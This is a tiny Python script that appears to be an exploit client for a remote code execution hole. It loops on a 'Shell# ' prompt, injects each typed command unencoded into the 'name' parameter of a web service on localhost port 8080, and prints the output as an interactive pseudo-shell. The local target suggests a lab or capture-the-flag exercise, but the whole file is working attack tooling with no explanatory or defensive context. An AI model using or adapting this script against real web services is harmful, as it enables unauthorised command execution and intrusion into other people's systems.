import requests
while True:
    rce = input("Shell# ")
    r = requests.get(f'http://127.0.0.1:8080/?name={rce}')
    print(r.text)
